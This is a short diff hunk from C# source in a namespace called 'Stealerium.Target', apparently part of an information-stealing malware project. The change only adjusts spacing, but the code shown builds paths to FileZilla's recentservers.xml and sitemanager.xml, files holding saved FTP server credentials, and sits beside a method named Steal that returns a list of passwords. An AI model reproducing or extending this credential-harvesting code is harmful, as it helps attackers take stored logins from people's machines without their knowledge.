@@ -13,7 +13,7 @@ namespace Stealerium.Target
         private static string[] GetPswPath()
         {
             var fz = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\";
-            return new[] {fz + "recentservers.xml", fz + "sitemanager.xml"};
+            return new[] { fz + "recentservers.xml", fz + "sitemanager.xml" };
         }
 
         private static List<Password> Steal(string sSavePath)
